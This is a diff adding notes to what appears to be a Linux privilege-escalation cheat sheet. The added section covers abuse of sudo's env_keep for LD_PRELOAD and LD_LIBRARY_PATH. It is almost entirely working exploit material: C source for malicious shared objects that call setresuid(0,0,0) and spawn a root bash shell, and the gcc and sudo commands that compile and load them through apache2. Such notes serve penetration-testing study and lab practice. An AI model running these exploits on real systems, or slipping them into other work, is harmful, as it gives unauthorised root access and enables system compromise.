@@ -38,3 +38,54 @@ whoami;id;pwd
 ### Sudo Shell Escape Sequences
 
 [GTFOBins](https://gtfobins.github.io/)
+
+### sudo environment variables
+
+#### LD_PRELOAD
+
+sudo -l
+env_keep+=LD_PRELOAD
+
+(exploit c code preload.c)
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2
+```
+
+#### LD_LIBRARY_PATH
+
+```
+sudo -l
+env_keep+=LD_LIBRARY_PATH
+
+ldd /usr/sbin/apache2
+```
+(exploit c code library_path.c)
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
+```
